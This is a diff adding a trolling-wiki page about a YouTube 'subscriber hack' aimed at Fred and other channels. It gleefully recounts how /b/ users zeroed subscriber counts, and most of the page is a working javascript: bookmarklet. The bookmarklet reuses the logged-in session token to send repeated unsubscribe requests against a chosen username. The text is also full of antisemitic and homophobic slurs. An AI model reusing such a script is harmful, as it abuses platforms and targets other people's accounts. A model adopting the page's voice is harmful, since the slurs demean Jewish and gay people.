@@ -1,0 +1,59 @@
+YouTube Subscriber Hack
+{{potential}}
+{{spoiler|FRED LOST ALL HIS SUBSCRIBERS}}[[Last Thursday]], the [[Skiddie|Script Kiddie]]s of [[b/|/b/]] found yet another loophole in the [[shit]] coding of [[YouTube|JewTube]]. Suddenly [[Cock|subscriber]] counts were dropping like [[Balls]]. People like [[Fred]] and [[Justin Bieber]] had the [[cock]]s ripped off them, as their subscriber counts dropped to [[0]]. The [[butthurt]] [[jews]] decided to continue to subscribe, to try and bring his count back up. No such [[fuck|luck]].
+
+[[Btard]]s would copy and paste this code into their address bar while signed into YouTube. From there they picked their target (default is Fred), hit the okay button two more times, and [[buttsechs|presto]]! Fred gets fucked. The Btards then left it open in a tab while going back to their usual [[Basement Dweller|slumber]]. Fred was now not #1.
+
+[[HAHA DISREGARD THAT I SUCK COCKS]] YouTube disabled the newly-discovered method and restored Fred's subscribers and [[Death|lowered the counts]] the [[Fag]]s who increased their subscriber count by reversing the script.
+
+
+
+== The Code ==
+<pre>
+javascript:function unsubscribe() {
+    httpreq=new XMLHttpRequest();
+    httpreq.open('post', '/ajax_subscriptions?edit_subscription=newsub&username='+username+'&subscription_level=unsubscribe', false);
+    httpreq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    httpreq.send('session_token='+yt.getConfig('SUBSCRIBE_AXC'));
+    if(!httpreq.responseXML) {
+        setTimeout('unsubscribe()', timeout);
+        return;
+    }
+    if(httpreq.responseXML.getElementsByTagName('html_content')[0].childNodes[0].nodeValue!='<h2>You have successfully unsubscribed.</h2>') {
+        alert(httpreq.responseXML.getElementsByTagName('html_content')[0].childNodes[0].nodeValue);
+    } else if((window.status=++count)!=times) {
+        setTimeout('unsubscribe()', timeout);
+    } else {
+        alert('DUN');
+    }
+}
+count=0;
+if((username=prompt('enter target\'s username', 'Fred'))!=null) {
+    if(!isNaN(timeout=parseInt(prompt('enter timeout in milliseconds', 250)))) {
+        if(!isNaN(times=parseInt(prompt('enter num of times to unsubscribe (0 = unlimited)', 0)))) {
+            unsubscribe();
+        }
+    }
+}
+void(0);
+
+</pre>
+
+== The Result ==
+{{frame|[[File:Fred_subscribers_skinny_edition.jpg]]}}
+<br/>
+
+== The Responce ==
+<youtube>7N-VnysP47g</youtube>
+== Related Articles ==
+*[[YouTube Independence Day]]
+*[[YouTube Super Fags]]
+*[[Youflood]]
+*[[DDoS]]
+
+<br/>
+
+
+{{ytseries}}
+{{trolls}}
+[[Category:Drama-generating techniques]] [[Category:Internets Phenomena]][[Category:Trolls]]
